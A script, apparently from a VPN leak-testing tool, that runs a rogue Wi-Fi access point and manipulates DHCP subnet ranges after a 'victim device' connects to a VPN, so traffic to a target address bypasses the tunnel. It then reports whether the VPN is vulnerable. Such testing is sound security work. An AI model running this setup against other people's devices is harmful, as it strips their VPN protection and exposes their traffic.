(*
 * Localnet expanded IP range state machine definition
 * Initially, we hand out public IP addresses in a range close to our target,
 * but the target is emphatically _outside_ of this range.
 * Then, we wait for the client to set up a VPN connection.
 * Once established, we let the dhcp lease expire, and we extend the range such that it _does_ cover the target.
 * In case the client's behavior is such that VPN routing rules are created only while
 * the VPN connection is being established, this sequence of events causes traffic to the target to flow directly.
 *)

state init begin:
  miscnet = miscnet();
  netmask = "255.255.255.0";
  (* we want target_ip to flow outside of the tunnel *)
  (* target_ip = miscnet.lookup_ipv4("yourserver.com"); *)
  target_ip = "82.165.202.191";
  (* select an ip within the same subnet but not equal to target_ip *)
  (* my_ip = miscnet.subnet_ip(target_ip, netmask); *)
  my_ip = "82.165.202.1";
  (* perform nat on the interface where our default gateway is at *)
  miscnet.masquerade("true");

  ap = accesspoint();
  ap.wifi_interface = "wlan0";
  ap.ipv4_addr = my_ip;
  ap.ipv4_netmask = netmask;
  ap.dhcp4_enable = "true";
  (* don't hand out target_ip to one of our clients *)
  ap.dhcp4_avoid = target_ip;
  ap.dhcp4_dns = my_ip;
  ap.dhcp4_netmask = "255.255.255.128";
  ap.dhcp4_router = my_ip;
  ap.dhcp4_leasetime = "15";
  (* route all the traffic within target_ip/24 to our default gateway *)
  ap.route_to_default = "true";
  ap.dns_enable = "true";
  (* ap.dns_set_override("yourserver.com", target_ip); *)
  ap.bring_up(ap_up, ap_err);

state ap_err:
  exit("failed to bring up access point: ", errstr);

state ap_up:
  mon = trafficmonitor();
  mon.interface = ap.ap_interface;
  (* make sure validation_server resolves to target_ip *)
  mon.validation_server = "https://yourserver.com/";
  (* specify vpn endpoints so that the monitor can detect whether vpn traffic occurs *)
  endpoints = "tcp://ams.nl.eduvpn.org:443;udp://ams.nl.eduvpn.org:443";
  endpoints = concat(endpoints, ";udp://ifi2-vpn.guest.eduvpn.no:1194");
  endpoints = concat(endpoints, ";udp://tekno-vpn.guest.eduvpn.no:1194");
  endpoints = concat(endpoints, ";udp://eduvpnga.ethernet.edu.et:1194");
  endpoints = concat(endpoints, ";udp://eduvpn.ac.lk:1194");
  endpoints = concat(endpoints, ";udp://eduvpn.renu.ac.ug:1194");
  endpoints = concat(endpoints, ";udp://eduvpn.uran.ua:1194");
  mon.vpn_endpoints = endpoints;
  mon.detect_vpn(vpn_detected, mon_err, "5000");
  print("[i] Please connect to the vpn on the victim device");

state mon_err:
  exit("Error occurred: ", errstr);

state vpn_detected:
  ap.dhcp4_netmask = "255.255.255.0";
  ap.dhcp4_reload();
  ap.dhcp4_renew(dhcp_renew);
  print("[i] Waiting for the dhcp lease to renew...");

state dhcp_renew:
  (* make sure validation_server resolves to target_ip *)
  mon.validation_server = "https://yourserver.com/";
  mon.detect_attack(vpn_safe, vpn_vuln, mon_err);

state vpn_safe:
  exit("Your vpn appears to be safe, congratulations!");

state vpn_vuln:
  exit("Your vpn appears to be vulnerable!");
